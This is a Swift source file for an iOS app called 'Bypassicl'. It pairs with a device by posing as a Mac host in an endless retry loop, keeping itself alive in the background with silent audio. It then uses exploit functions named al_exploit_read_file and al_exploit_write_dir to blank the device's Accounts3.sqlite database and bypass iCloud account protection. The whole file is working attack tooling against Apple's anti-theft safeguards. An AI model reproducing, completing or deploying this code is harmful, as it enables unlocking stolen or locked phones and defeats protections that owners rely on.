// ============================================================
// AirliftService.swift — Bypassicl (Infinite Retry Loop)
// ============================================================

import Foundation
import Combine
import UniformTypeIdentifiers
import Network
import AVFoundation
import UIKit
import UserNotifications
import BackgroundTasks

@MainActor
class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
    static let shared = AirliftService()
    
    @Published var logs: String = "=== Bypassicl Log ===\n"
    @Published var isPairing = false
    @Published var currentPin: String? = nil
    @Published var pairingFilePath: String? = nil
    @Published var lastDeviceName: String? = nil
    
    private var netService: NetService?
    private var audioPlayer: AVAudioPlayer?
    private var bgTask: BGContinuedProcessingTask?
    private var pairingStarted = false
    private var taskFinished = false
    
    private let localNetwork = LocalNetworkAuthorization()
    private let accountsDir = "/var/mobile/Library/Accounts"
    private let targetFiles = ["Accounts3.sqlite", "Accounts3.sqlite-shm", "Accounts3.sqlite-wal"]
    
    var backupDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0].appendingPathComponent("AccountsBackup")
    }
    private var documentsDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
    }
    var hasCompleteBackup: Bool {
        let fm = FileManager.default
        return targetFiles.allSatisfy { fm.fileExists(atPath: backupDir.appendingPathComponent($0).path) }
    }
    
    override init() {
        super.init()
        registerBackgroundTask()
    }
    
    private func log(_ message: String) {
        self.logs += message + "\n"
        print(message)
    }
    
    // ============================================================
    // FFI CALLBACKS
    // ============================================================
    private static let logCallback: ALLogCallback = { ctx, msg in
        guard let msg = msg, let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        DispatchQueue.main.async { service.log("[Airlift] \(String(cString: msg))") }
    }
    
    private static let pinCallback: ALPairPinCb = { pin, ctx in
        guard let ctx = ctx, let pin = pin else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        let pinStr = String(cString: pin)
        DispatchQueue.main.async {
            service.currentPin = pinStr
            service.log("🔐 PIN READY: \(pinStr)")
            service.presentPin(pinStr)
        }
    }
    
    private static let readyCallback: ALPairReadyCb = { ctx, serviceID, port, keys, vals, count in
        guard let ctx = ctx, let serviceID = serviceID else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        let id = String(cString: serviceID)

        var txt: [String: Data] = [:]
        if let keys = keys, let vals = vals {
            for i in 0..<Int(count) {
                guard let k = keys[i], let v = vals[i] else { continue }
                txt[String(cString: k)] = Data(String(cString: v).utf8)
            }
        }

        DispatchQueue.main.async {
            service.startAdvertising(serviceID: id, port: Int32(port), txt: txt)
        }
    }
    
    // ============================================================
    // BACKGROUND TASK & AUDIO KEEP ALIVE
    // ============================================================
    nonisolated private func registerBackgroundTask() {
        let taskId = (Bundle.main.bundleIdentifier ?? "com.bypassicl.app") + ".pairing"
        BGTaskScheduler.shared.register(forTaskWithIdentifier: taskId, using: DispatchQueue.main) { task in
            guard let task = task as? BGContinuedProcessingTask else { return }
            MainActor.assumeIsolated { AirliftService.shared.runPairing(task: task) }
        }
    }
    
    private func startKeepAliveAudio() {
        do {
            let session = AVAudioSession.sharedInstance()
            try session.setCategory(.playback, options: [.mixWithOthers])
            try session.setActive(true)

            let sr: UInt32 = 8000, ns: UInt32 = 8000, ds = ns * 2
            var wav = Data()
            wav.append("RIFF".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: (36 + ds).littleEndian) { Data($0) })
            wav.append("WAVEfmt ".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: UInt32(16).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(1).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(1).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: sr.littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: (sr * 2).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(2).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(16).littleEndian) { Data($0) })
            wav.append("data".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: ds.littleEndian) { Data($0) })
            wav.append(Data(count: Int(ds)))

            let player = try AVAudioPlayer(data: wav)
            player.numberOfLoops = -1
            player.volume = 0.01
            player.play()
            audioPlayer = player
        } catch {
            log("⚠️ Audio keep-alive error: \(error.localizedDescription)")
        }
    }

    private func stopKeepAliveAudio() {
        audioPlayer?.stop()
        audioPlayer = nil
        try? AVAudioSession.sharedInstance().setActive(false)
    }
    
    // ============================================================
    // ENTRY POINT
    // ============================================================
    func startPairingOnDevice() {
        guard !isPairing else { return }
        
        self.isPairing = true
        self.currentPin = nil
        self.pairingStarted = false
        self.log("[*] Starting Pair on Device (Infinite Mode)...")
        
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound]) { _, _ in }
        
        self.startKeepAliveAudio()
        
        Task.detached { [weak self] in
            _ = await self?.localNetwork.request()
        }
        
        self.submitBackgroundTask()
    }
    
    private func submitBackgroundTask() {
        let taskId = (Bundle.main.bundleIdentifier ?? "com.bypassicl.app") + ".pairing"
        let request = BGContinuedProcessingTaskRequest(
            identifier: taskId,
            title: "Bypassicl",
            subtitle: "Waiting for a device to connect…")
        request.strategy = .queue

        do { try BGTaskScheduler.shared.submit(request) } catch {}
        
        self.runPairing(task: nil)
    }
    
    // ============================================================
    // INFINITE RETRY LOOP (CHỐNG XOÁ PAIRING)
    // ============================================================
    private func runPairing(task: BGContinuedProcessingTask?) {
        guard !pairingStarted else { return }
        pairingStarted = true
        taskFinished = false
        bgTask = task
        
        task?.progress.totalUnitCount = 100
        task?.progress.completedUnitCount = 5
        task?.expirationHandler = { [weak self] in
            guard let self = self else { return }
            Task { @MainActor in
                self.isPairing = false // Dừng vòng lặp
                self.finishTask(success: false)
                self.log("❌ Background time expired.")
            }
        }
        
        let outPath = self.documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing").path
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        
        DispatchQueue.global(qos: .userInitiated).async {
            var isSuccess = false
            var finalPath: String? = nil
            var finalName: String? = nil

            // VÒNG LẶP VÔ HẠN: Chạy lại host ngay khi nó return
            while true {
                // Check xem user có bấm Hủy bên Main Thread không
                var shouldContinue = false
                DispatchQueue.main.sync { shouldContinue = self.isPairing }
                if !shouldContinue { break }

                var result = ALPairResult()
                let code = al_pairing_run_host(
                    "0.0.0.0", 0, "Bypassicl", "Mac17,7", outPath, nil,
                    AirliftService.readyCallback, AirliftService.pinCallback, ctx, &result
                )

                if code == 0 {
                    // THÀNH CÔNG -> Lấy data và thoát vòng lặp
                    isSuccess = true
                    if let p = result.pairing_file_path { finalPath = String(cString: p) }
                    if let n = result.device_name { finalName = String(cString: n) }
                    al_pairing_result_free(&result)
                    break
                } else {
                    // THẤT BẠI / NGẮT KẾT NỐI -> Xóa data cũ, chờ 0.5s rồi chạy lại
                    let err = result.error != nil ? String(cString: result.error!) : "unknown"
                    al_pairing_result_free(&result)
                    
                    DispatchQueue.main.async {
                        self.log("🔄 Kết nối ngắt (\(err)). Đang khởi động lại Host...")
                        self.currentPin = nil // Xóa PIN cũ
                    }
                    
                    Thread.sleep(forTimeInterval: 0.5)
                }
            }

            // DỌN DẸP SAU KHI XONG
            DispatchQueue.main.async {
                self.pairingStarted = false
                self.isPairing = false
                self.stopAdvertising()
                self.stopKeepAliveAudio()

                if isSuccess {
                    self.pairingFilePath = finalPath
                    self.lastDeviceName = finalName
                    self.log("✅ Pairing successful! File: \(finalPath ?? "")")
                    self.bgTask?.progress.completedUnitCount = 100
                    self.postReturnNotification()
                } else {
                    self.log("⏹ Pairing cancelled.")
                }
                self.finishTask(success: isSuccess)
            }
        }
    }
    
    private func finishTask(success: Bool) {
        guard !taskFinished else { return }
        taskFinished = true
        bgTask?.setTaskCompleted(success: success)
        bgTask = nil
    }
    
    // ============================================================
    // ADVERTISING
    // ============================================================
    private func startAdvertising(serviceID: String, port: Int32, txt: [String: Data]) {
        stopAdvertising()
        let service = NetService(domain: "", type: "_remotepairing-pairable-host._tcp.", name: serviceID, port: port)
        service.setTXTRecord(NetService.data(fromTXTRecord: txt))
        service.schedule(in: .main, forMode: .common)
        service.delegate = self
        service.publish()
        netService = service
        log("🔊 Bonjour publishing: \(serviceID) @ \(port)")
    }
    
    private func stopAdvertising() {
        netService?.stop()
        netService = nil
    }
    
    private func presentPin(_ pin: String) {
        bgTask?.progress.completedUnitCount = 50
        bgTask?.updateTitle("Bypassicl", subtitle: "Enter code \(pin)")
        
        let content = UNMutableNotificationContent()
        content.title = "Bypassicl pairing code"
        content.body = "Enter \(pin) on this device to pair."
        content.sound = .default
        let request = UNNotificationRequest(identifier: "bypassicl.pin", content: content, trigger: nil)
        UNUserNotificationCenter.current().add(request)
    }
    
    private func postReturnNotification() {
        let content = UNMutableNotificationContent()
        content.title = "Pairing complete"
        content.body = "Return to Bypassicl to export the pairing file."
        content.sound = .default
        let request = UNNotificationRequest(identifier: "bypassicl.done", content: content, trigger: nil)
        UNUserNotificationCenter.current().add(request)
    }

    // ============================================================
    // CÁC HÀM CŨ CỦA BYPASSICL (Giữ nguyên)
    // ============================================================
    func connect() -> Bool {
        log("[*] Checking pairing...")
        if pairingFilePath == nil {
            for name in ["pairingRecord.mobiledevicepairing", "pairingRecord.plist", "pairing.plist"] {
                let url = documentsDir.appendingPathComponent(name)
                if FileManager.default.fileExists(atPath: url.path) {
                    pairingFilePath = url.path
                    break
                }
            }
        }
        guard let path = pairingFilePath, FileManager.default.fileExists(atPath: path) else {
            log("❌ No pairing file found.")
            return false
        }
        log("✅ Using pairing file: \(path)")
        return true
    }

    func importPairingFile(from url: URL) {
        let accessing = url.startAccessingSecurityScopedResource()
        defer { if accessing { url.stopAccessingSecurityScopedResource() } }
        do {
            try FileManager.default.createDirectory(at: documentsDir, withIntermediateDirectories: true)
            let dest = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing")
            try Data(contentsOf: url).write(to: dest, options: .atomic)
            self.pairingFilePath = dest.path
            self.log("✅ Pairing file imported")
        } catch {
            log("❌ Import failed: \(error.localizedDescription)")
        }
    }

    private func ffi_read_file(_ iosPath: String) -> Data? {
        guard let pairing = pairingFilePath else { return nil }
        var outData: UnsafeMutablePointer<UInt8>? = nil
        var outLen: size_t = 0
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        let result = al_exploit_read_file(pairing, iosPath, AirliftService.logCallback, ctx, &outData, &outLen, &outError)
        defer {
            if let e = outError { al_string_free(e) }
            if let d = outData { al_bytes_free(d, outLen) }
        }
        guard result == 0, let ptr = outData, outLen > 0 else {
            let err = outError != nil ? String(cString: outError!) : "unknown"
            log("❌ Read \(iosPath) failed: \(err)")
            return nil
        }
        return Data(bytes: ptr, count: Int(outLen))
    }

    private func ffi_write_dir(sourceDir: String, targetDir: String) -> Bool {
        guard let pairing = pairingFilePath else { return false }
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        let result = al_exploit_write_dir(pairing, sourceDir, targetDir, AirliftService.logCallback, ctx, &outError)
        defer { if let e = outError { al_string_free(e) } }
        guard result == 0 else {
            let err = outError != nil ? String(cString: outError!) : "unknown"
            log("❌ Write failed: \(err)")
            return false
        }
        return true
    }

    private func autoBackupAccountsIfNeeded() -> Bool {
        if hasCompleteBackup {
            log("ℹ️ Original backup exists — keeping it.")
            return true
        }
        log("[*] Auto-backing up Accounts files...")
        do {
            try FileManager.default.createDirectory(at: backupDir, withIntermediateDirectories: true)
        } catch {
            log("❌ Backup dir: \(error.localizedDescription)")
            return false
        }
        for file in targetFiles {
            let path = "\(accountsDir)/\(file)"
            guard let data = ffi_read_file(path) else {
                log("❌ Auto-backup failed for \(file)")
                return false
            }
            do {
                try data.write(to: backupDir.appendingPathComponent(file), options: .atomic)
                log("✅ Backup: \(file) (\(data.count) bytes)")
            } catch {
                log("❌ Write backup \(file): \(error.localizedDescription)")
                return false
            }
        }
        log("✅ Auto-backup done: \(backupDir.path)")
        return true
    }

    func bypassICloud() {
        log("[*] Starting Bypass...")
        guard autoBackupAccountsIfNeeded() else {
            log("❌ Bypass cancelled — backup failed")
            return
        }
        let tmp = FileManager.default.temporaryDirectory.appendingPathComponent("empty_\(UUID().uuidString)")
        do {
            try FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)
            for file in targetFiles {
                try Data().write(to: tmp.appendingPathComponent(file), options: .atomic)
            }
        } catch {
            log("❌ Overwrite prep: \(error.localizedDescription)")
            return
        }
        if ffi_write_dir(sourceDir: tmp.path, targetDir: accountsDir) {
            log("🎉 BYPASS SUCCESSFUL! Reboot.")
        } else {
            log("❌ Failed to write files")
        }
        try? FileManager.default.removeItem(at: tmp)
    }

    func restoreOriginalAccounts() {
        log("[*] Restoring original accounts...")
        let fm = FileManager.default
        let stagingDir = FileManager.default.temporaryDirectory.appendingPathComponent("restore_\(UUID().uuidString)")
        do {
            try fm.createDirectory(at: stagingDir, withIntermediateDirectories: true)
            for file in targetFiles {
                let backupFileURL = backupDir.appendingPathComponent(file)
                guard fm.fileExists(atPath: backupFileURL.path) else {
                    log("❌ Missing backup: \(file)")
                    return
                }
                try fm.copyItem(at: backupFileURL, to: stagingDir.appendingPathComponent(file))
            }
            if ffi_write_dir(sourceDir: stagingDir.path, targetDir: accountsDir) {
                log("✅ Restored originals! Reboot.")
            } else {
                log("❌ Restore write failed")
            }
        } catch {
            log("❌ Restore: \(error.localizedDescription)")
        }
        try? fm.removeItem(at: stagingDir)
    }
}

// ============================================================
// LOCAL NETWORK AUTHORIZATION
// ============================================================
@MainActor
final class LocalNetworkAuthorization {
    private var browser: NWBrowser?
    private var listener: NWListener?
    private var continuation: CheckedContinuation<Bool, Never>?

    private let probeType = "_bypassiclprobe._tcp"

    func request(timeout: TimeInterval = 5) async -> Bool {
        await withCheckedContinuation { (cont: CheckedContinuation<Bool, Never>) in
            self.continuation = cont

            let params = NWParameters.tcp
            params.includePeerToPeer = true

            let listener = try? NWListener(using: params)
            listener?.service = NWListener.Service(name: "BypassiclProbe", type: probeType)
            listener?.newConnectionHandler = { $0.cancel() }
            listener?.stateUpdateHandler = { [weak self] state in
                if case .failed = state {
                    Task { @MainActor in self?.finish(false) }
                }
            }
            self.listener = listener

            let browser = NWBrowser(for: .bonjour(type: probeType, domain: nil), using: params)
            browser.stateUpdateHandler = { [weak self] state in
                if case .failed = state {
                    Task { @MainActor in self?.finish(false) }
                }
            }
            browser.browseResultsChangedHandler = { [weak self] results, _ in
                if !results.isEmpty {
                    Task { @MainActor in self?.finish(true) }
                }
            }
            self.browser = browser

            listener?.start(queue: .main)
            browser.start(queue: .main)

            DispatchQueue.main.asyncAfter(deadline: .now() + timeout) { [weak self] in
                Task { @MainActor in self?.finish(false) }
            }
        }
    }

    private func finish(_ authorized: Bool) {
        guard let cont = continuation else { return }
        continuation = nil
        cont.resume(returning: authorized)
        browser?.cancel(); browser = nil
        listener?.cancel(); listener = nil
    }
}